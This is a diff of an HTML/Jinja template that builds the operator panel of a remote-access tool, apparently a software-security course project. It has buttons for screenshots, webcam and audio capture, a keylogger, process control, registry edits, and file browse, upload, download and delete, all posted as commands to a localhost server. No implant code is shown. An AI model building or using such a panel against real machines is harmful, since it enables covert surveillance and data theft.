@@ -1,10 +1,256 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
     <title>This is a test</title>
+<!--    <<meta http-equiv="Refresh" content="2;http://localhost:5000/index" />-->
+
 </head>
 <body>
-    <p>your name is {{ name }}</p>
+
+    <div class="con_left">
+        <h1 align="center" style="font-size:50px">G11 Remote Controller</h1>
+        <div class="filemanager">
+            <button type="button" style="width:120px;height:40px;"  value="screenshot" onclick="myfunc(this)">Screenshot</button>
+            <button type="button" style="width:120px;height:40px;" value="camshot" onclick="myfunc(this)">Camshot</button>
+            <button type="button" style="width:120px;height:40px;" value="cam_video" onclick="myfunc(this)">Cam Video</button>
+            <button type="button" style="width:120px;height:40px;" value="audio" onclick="myfunc(this)">Audio Capture</button>
+            <br/>
+
+            <button type="button"  style="width:120px;height:40px;" value="keyboard" onclick="myfunc(this)">Keyboard Monitor</button><br/><br/>
+
+            <form action="/fronttest" method="post">
+                Pid<input type="text" value="Please input pid to kill", name="pid">
+                <input type="submit" value="Kill Process" style="width:120px;height:40px;">
+            </form>
+
+            <button type="button"  style="width:120px;height:40px;" value="show_proc" onclick="myfunc(this)">Show Process</button>
+            <button type="button"  style="width:120px;height:40px;" value="create_proc" onclick="myfunc(this)">Create Process</button>
+<!--            <button type="button"  style="width:120px;height:40px;" value="kill_proc" onclick="myfunc(this)">Kill Process</button><br/>-->
+            <br/>
+            <button type="button"  style="width:120px;height:40px;" value="register" onclick="myfunc(this)">Register</button>
+            <br/><br/>
+            <button type="button"  style="width:120px;height:40px;" value="filebrowser" onclick="myfunc(this)">Browser files</button>
+
+
+            <button type="button" style="width:120px;height:40px;" value="upload" onclick="myfunc(this)">Download</button>
+            <input type="file" id="btn_file" style="display:none">
+            <button type="button" style="width:120px;height:40px;" value="download" onclick="F_Open_dialog()">Upload</button><br/>
+
+            <button type="button" style="width:120px;height:40px;" value="add_reg" onclick="myfunc(this)">Add Reg</button>
+            <button type="button" style="width:120px;height:40px;" value="delete_reg" onclick="myfunc(this)">Delete Reg</button>
+            <button type="button" style="width:120px;height:40px;" value="ie_reg_modify" onclick="myfunc(this)">IE Reg Modify</button>
+            <button type="button" style="width:120px;height:40px;" value="disp_reg" onclick="myfunc(this)">Display Reg</button><br/>
+
+            <script type="text/javascript">
+                function F_Open_dialog()
+                {
+                    var ret = document.getElementById("btn_file").click();
+                    alert(ret)
+                }
+
+                function myfunc(cmd_type) {
+                    //alert("fuck");
+                    //alert(cmd_type.value)
+                    var httpRequest = new XMLHttpRequest();
+                    httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+                    httpRequest.setRequestHeader("Content-type","application/json");
+
+                    if (cmd_type.value === "filebrowser") {
+                        //alert("success");
+                        httpRequest.send(JSON.stringify({"command": "dir"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "screenshot") {
+                        httpRequest.send(JSON.stringify({"command": "screenshot"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "upload") {
+                        httpRequest.send(JSON.stringify({"command": "upload F:\\current_semester\\software_security\\shell\\1.png"}));//发送请求 将json写入send中
+                        setTimeout("tmp", 2);
+                        var a = window.open("https://pics3.baidu.com/feed/8d5494eef01f3a29bf4689aeb052ce385d607c40.jpeg?token=3bdcc9dcfb21bd1be580e36cd91f26a6","", "width=200, height=200");
+                        a.document.execCommand("SaveAs");
+                        a.close();
+                    } else if(cmd_type.value === "download") {
+                        httpRequest.send(JSON.stringify({"command": "download http://localhost:5000/static/demo.txt F:\\test"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "camshot") {
+                        httpRequest.send(JSON.stringify({"command": "camshot"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "cam_video") {
+                        httpRequest.send(JSON.stringify({"command": "cam_video"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "show_proc") {
+                        httpRequest.send(JSON.stringify({"command": "tasklist"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "create_proc") {
+                        httpRequest.send(JSON.stringify({"command": "create_proc"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "audio") {
+                        httpRequest.send(JSON.stringify({"command": "audiocatch"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "keyboard") {
+                        httpRequest.send(JSON.stringify({"command": "keylogger"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "add_reg") {
+                        httpRequest.send(JSON.stringify({"command": "add_reg"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "ie_reg_modify") {
+                        httpRequest.send(JSON.stringify({"command": "ie_reg_modify"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "disp_reg") {
+                        httpRequest.send(JSON.stringify({"command": "disp_reg"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "delete_reg") {
+                        httpRequest.send(JSON.stringify({"command": "delete_reg"}));//发送请求 将json写入send中
+                    } else if(cmd_type.value === "cd") {
+                        httpRequest.send(JSON.stringify({"command": "cd"}));//发送请
+                    }
+                    setTimeout(function () {
+	                    window.location.reload();
+                    }, 1000);
+                }
+                function tmp() {
+                    var a = 1;
+                }
+             </script>
+            <button type="button" style="width:120px;height:40px;" value="cd" onclick="myfunc(this)">返回上级目录</button><br/>
+
+             <p>目录:{{ filepath }}</p>
+                <table border="1">
+
+                <tr>
+                    <th>Type</th>
+                    <th>LastWriteDate</th>
+                    <th>LastWriteTime</th>
+                    <th>Length(bytes)</th>
+                    <th>Name</th>
+                    <th>Function</th>
+                </tr>
+                {% for file_entry in file_entries %}
+                <tr>
+                    <td>{{file_entry['Type']}}</td>
+                    <td>{{file_entry['LastWriteDate']}}</td>
+                    <td>{{file_entry['LastWriteTime']}}</td>
+                    <td>{{file_entry['Length']}}</td>
+                    <td>{{file_entry['Name']}}</td>
+                    <td><button type="button" value={{file_entry['Name']}} name={{filepath}} onclick="deletefile(this)">删除</button></td>
+                     <script type="text/javascript">
+                        function deletefile(file) {
+                            filename = file.value
+                            path = file.name + '\\'+filename
+                            //alert(path)
+                            var httpRequest = new XMLHttpRequest();
+                            httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+                            httpRequest.setRequestHeader("Content-type","application/json");
+                            httpRequest.send(JSON.stringify({"command": "del", "path": path}));
+                            setTimeout(function () {
+	                    window.location.reload();
+                    }, 1000);
+                        }
+                     </script>
+                     <td><button type="button" value={{file_entry['Name']}} name={{filepath}} onclick="download(this)">下载</button></td>
+                     <script type="text/javascript">
+                        function download(file) {
+                            filename = file.value
+                            path = file.name + '\\'+filename
+                            //alert(path)
+                            var httpRequest = new XMLHttpRequest();
+                            httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+                            httpRequest.setRequestHeader("Content-type","application/json");
+                            httpRequest.send(JSON.stringify({"command": "upload"+" "+path}));
+                            setTimeout(function () {
+	                    window.location.reload();
+                    }, 1000);
+                        }
+                    </script>
+
+                    <td><button type="button" value={{file_entry['Name']}} name={{file_entry['Type']}} onclick="opendir(this)">打开</button></td>
+                     <script type="text/javascript">
+                        function opendir(file) {
+                            type = file.name
+                            filename = file.value
+                            //alert(path)
+                            var httpRequest = new XMLHttpRequest();
+                            httpRequest.open('POST', 'http://localhost:5000/fronttest', true);
+                            httpRequest.setRequestHeader("Content-type","application/json");
+                            httpRequest.send(JSON.stringify({"command": "dir " + filename}));
+                            setTimeout(function () {
+	                    window.location.reload();
+                    }, 1000);
+                        }
+                    </script>
+
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+    </div>
+    <div class="con_right">
+         <textarea id="testScrollTextArea" rows="55" disabled>
+             {{ command_output }}}
+         </textarea>
+        <script>
+            window.onload = function init(params) {
+            var textArea = document.getElementById("testScrollTextArea");
+            textArea.scrollTo(0, textArea.scrollHeight)
+                /*
+            for (let i = 0; i < 1000; i++) {
+            setTimeout(() => {
+            	// 此处可以是Ajax请求的数据或者websocket通信的数据
+                var childText = document.createTextNode(new Date() + ": 后台处理进度：" + i + "\n");
+                textArea.appendChild(childText);
+                // 滚动到底部
+                console.log(textArea.scrollHeight)
+
+            }, 400 * i)
+            }
+            */
+
+            }
+        </script>
+
+        <style>
+            #testScrollTextArea {
+                resize: none;
+                width: 100%;
+                height: 100%;
+                /*margin: 10% 30%;*/
+                font-size: 15px;
+                position: relative;
+                top: 0%;
+                left:0%;
+                background-color: #000207;
+                color: #10d910;
+
+            }
+
+            #testScrollTextArea::-webkit-scrollbar {
+                width: 8px;
+            }
+
+            #testScrollTextArea::-webkit-scrollbar-track {
+                background-color: #ffffff;
+                -webkit-border-radius: 2em;
+                -moz-border-radius: 2em;
+                border-radius: 2em;
+            }
+
+            #testScrollTextArea::-webkit-scrollbar-thumb {
+                background-color: #a9a9ab;
+                -webkit-border-radius: 2em;
+                -moz-border-radius: 2em;
+                border-radius: 2em;
+            }
+        </style>
+    </div>
+
 </body>
+<style>
+    .con_left{
+        float:left;
+        width:50%;
+        height:100%
+        border:1px solid #060}
+    .con_right{
+        float:right;
+        width:50%;
+        height:100%
+        border:1px solid #00F}
+    .filemanager {
+        height: 50%
+        border: 1px solid #661800
+        overflow:auto;
+    }
+    .procmanager {
+        height: 50%
+        border: 1px solid #000e66
+        overflow:auto;
+    }
+</style>
 </html>
